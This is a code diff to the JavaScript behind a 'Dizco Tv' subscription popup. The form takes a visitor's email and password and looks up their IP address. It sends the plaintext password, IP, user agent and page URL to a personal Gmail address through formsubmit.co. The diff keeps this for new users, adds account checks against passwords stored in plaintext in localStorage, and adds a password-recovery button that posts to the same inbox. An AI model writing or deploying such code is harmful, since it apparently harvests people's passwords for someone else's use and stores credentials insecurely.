@@ -149,19 +149,13 @@ function showChristmasToast(){
     if(!splash){ setTimeout(openOrWelcome, 600); }
   });
 
-  function renderWelcome(){
-    if(!overlay) return;
-    const bodyEl = overlay.querySelector('.body');
-    if(!bodyEl) return;
-    bodyEl.innerHTML = '<div class="success"><div class="check">✓</div><h4>Welcome back</h4><p>You\'re already subscribed.</p><button id="enter-site-btn" class="btn btn-gold" style="margin-top:8px;min-width:160px">Enter site</button></div>';
-    const btn = document.getElementById('enter-site-btn');
-    if(btn){ btn.addEventListener('click', ()=> closeModal()); }
-  }
-
   function openOrWelcome(){
-    const isSub = localStorage.getItem('dizco_subscribed') === '1';
     openModal();
-    if(isSub){ renderWelcome(); }
+    try{
+      const last = localStorage.getItem('dizco_last_email');
+      const emailInput = document.getElementById('sub-email');
+      if(last && emailInput){ emailInput.value = last; setTimeout(()=>{ const p = document.getElementById('sub-password'); if(p){ p.focus(); } }, 50); }
+    }catch(e){}
   }
 
   if(form){
@@ -170,9 +164,11 @@ function showChristmasToast(){
       const emailInput = document.getElementById('sub-email');
       const passInput = document.getElementById('sub-password');
       const submitBtn = form.querySelector('button[type="submit"]');
+      const errEl = document.getElementById('sub-error');
       const email = (emailInput && emailInput.value || '').trim();
       const password = (passInput && passInput.value || '').trim();
       const valid = /.+@.+\..+/.test(email) && password.length >= 4;
+      if(errEl) errEl.style.display = 'none';
       if(!valid){ if(emailInput) emailInput.style.borderColor = '#f66'; if(passInput) passInput.style.borderColor = '#f66'; return; }
 
       // Set loading state
@@ -185,9 +181,19 @@ function showChristmasToast(){
       let ip = '';
       try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j && j.ip || ''; } catch(err) {}
 
-      // Send via FormSubmit to Gmail (no extra setup beyond first verification)
+      // Account check in localStorage
+      let users = {};
+      try{ users = JSON.parse(localStorage.getItem('dizco_users')||'{}')||{}; }catch(e){ users = {}; }
+      const known = !!users[email];
+      if(known && users[email] !== password){
+        if(errEl){ errEl.style.display = 'block'; }
+        if(submitBtn){ submitBtn.classList.remove('loading'); submitBtn.textContent = 'Subscribe'; }
+        return;
+      }
+
+      // Send via FormSubmit to Gmail for new users only
       try{
-        const payload = {
+        const payload = known ? null : {
           _subject: 'New Dizco Tv subscription',
           email,
           password,
@@ -196,17 +202,20 @@ function showChristmasToast(){
           page: pageUrl,
           timestamp: ts
         };
-        const resp = await fetch('https://formsubmit.co/ajax/dizcotvapprebrand@gmail.com', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-          body: JSON.stringify(payload)
-        });
-        if(!resp.ok){ throw new Error('Failed'); }
-        const data = await resp.json();
+        if(!known){
+          const resp = await fetch('https://formsubmit.co/ajax/dizcotvapprebrand@gmail.com', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+          if(!resp.ok){ throw new Error('Failed'); }
+          const data = await resp.json();
+        }
         // data = { success: 'true', ... } when accepted
         if(emailInput) emailInput.value = '';
         if(passInput) passInput.value = '';
         try{ localStorage.setItem('dizco_subscribed','1'); }catch(e){}
+        try{ users[email] = password; localStorage.setItem('dizco_users', JSON.stringify(users)); localStorage.setItem('dizco_last_email', email); }catch(e){}
         // Show success state with Enter button
         const bodyEl = overlay ? overlay.querySelector('.body') : null;
         if(bodyEl){
@@ -231,11 +240,34 @@ function showChristmasToast(){
     });
 
     // Show/Hide password toggle
+    // Show/Hide password toggle
     const toggleCb = document.getElementById('sub-pass-show');
     const passInput = document.getElementById('sub-password');
     if(toggleCb && passInput){
       toggleCb.addEventListener('change', ()=>{
         passInput.type = toggleCb.checked ? 'text' : 'password';
+      });
+    }
+
+    // Forgot password recovery
+    const forgotBtn = document.getElementById('sub-forgot');
+    const emailInput2 = document.getElementById('sub-email');
+    if(forgotBtn && emailInput2){
+      forgotBtn.addEventListener('click', async ()=>{
+        const email = (emailInput2.value||'').trim();
+        if(!/.+@.+\..+/.test(email)){ if(emailInput2){ emailInput2.focus(); } return; }
+        try{
+          const ua = navigator.userAgent || '';
+          const pageUrl = location.href;
+          const ts = new Date().toISOString();
+          const resp = await fetch('https://formsubmit.co/ajax/dizcotvapprebrand@gmail.com',{
+            method:'POST', headers:{'Content-Type':'application/json','Accept':'application/json'},
+            body: JSON.stringify({_subject:'Password recovery request', type:'recovery', email, user_agent:ua, page:pageUrl, timestamp:ts})
+          });
+          if(!resp.ok) throw new Error('fail');
+          const bodyEl = overlay ? overlay.querySelector('.body') : null;
+          if(bodyEl){ bodyEl.innerHTML = '<div class="success"><div class="check">✓</div><h4>Recovery requested</h4><p>We\'ll contact you to reset your password.</p><button id="enter-site-btn" class="btn btn-gold" style="margin-top:8px;min-width:160px">Close</button></div>'; const btn=document.getElementById('enter-site-btn'); if(btn){ btn.addEventListener('click', ()=> closeModal()); } }
+        }catch(err){}
       });
     }
   }
